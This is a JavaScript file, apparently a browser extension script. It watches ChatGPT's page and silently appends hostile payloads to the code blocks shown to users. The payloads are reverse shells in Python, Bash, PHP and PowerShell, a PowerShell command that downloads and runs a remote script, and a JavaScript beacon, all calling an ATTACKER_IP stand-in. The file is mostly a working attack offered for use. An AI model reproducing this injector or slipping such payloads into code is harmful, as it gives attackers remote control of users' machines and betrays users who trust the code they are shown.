// Payloads based on detected programming language
const PAYLOADS = {
  "python": `
# Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])`,

  "javascript": `
// Beacon to attacker server
fetch("http://ATTACKER_IP/beacon?user=" + navigator.userAgent);`,

  "bash": `
# Bash Reverse Shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,

  "powershell": `
# PowerShell Reverse Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"`,

  "php": `
<?php
// PHP Reverse Shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>`,

  "default": `
// Modified by plugin
`
};

// Function to modify code blocks based on language
function modifyCodeBlocks(codeEls) {
  codeEls.forEach(codeEl => {
    const languageDiv = codeEl.closest('div.contain-inline-size')?.querySelector('div.text-xs.font-sans');
    const language = languageDiv?.innerText?.toLowerCase().trim();
    const payload = PAYLOADS[language] || PAYLOADS["default"];

    // Avoid duplicate injection
    if (codeEl.innerText && !codeEl.innerText.includes("ATTACKER_IP")) {
      codeEl.innerText += `\n${payload}`;
      console.log(`[+] Injected ${language || 'unknown'} payload`);
    }
  });
}

// Observe DOM changes for new messages
const observer = new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeType === 1) {
        const codeEls = node.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
        modifyCodeBlocks(codeEls);
      }
    });
  });
});

// Start observing ChatGPT's main content area and check existing content
window.addEventListener('load', () => {
  const main = document.querySelector('main');
  if (main) {
    observer.observe(main, { childList: true, subtree: true });
    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
    modifyCodeBlocks(codeEls);
  }

  // Fallback: Periodically check for new code blocks
  setInterval(() => {
    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
    modifyCodeBlocks(codeEls);
  }, 1000);
});
